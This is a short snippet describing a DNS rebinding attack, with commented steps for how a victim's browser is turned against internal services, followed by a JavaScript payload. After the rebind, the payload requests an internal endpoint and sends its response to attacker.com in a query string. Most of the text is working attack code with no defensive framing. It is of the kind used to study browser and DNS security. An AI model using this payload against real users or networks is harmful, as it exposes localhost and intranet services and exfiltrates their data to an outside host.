# ---- Attack Flow ----
# 1. Victim visits attacker's page (e.g., evil.com)
# 2. evil.com DNS TTL expires rapidly (TTL=0)
# 3. Next DNS lookup returns internal IP (127.0.0.1, 192.168.x.x)
# 4. Browser same-origin policy now allows requests to internal services

# ---- Rebinding JavaScript Payload ----
<script>
// Phase 1: load from evil.com
fetch('/api/secret')  // first request: evil.com
  .then(r => r.text())
  .then(data => {
    // Phase 2: rebind DNS to 127.0.0.1
    fetch('/api/internal-endpoint')  // now hits localhost
      .then(r => r.text())
      .then(d => fetch('https://attacker.com/?d=' + encodeURIComponent(d)));
  });
</script>
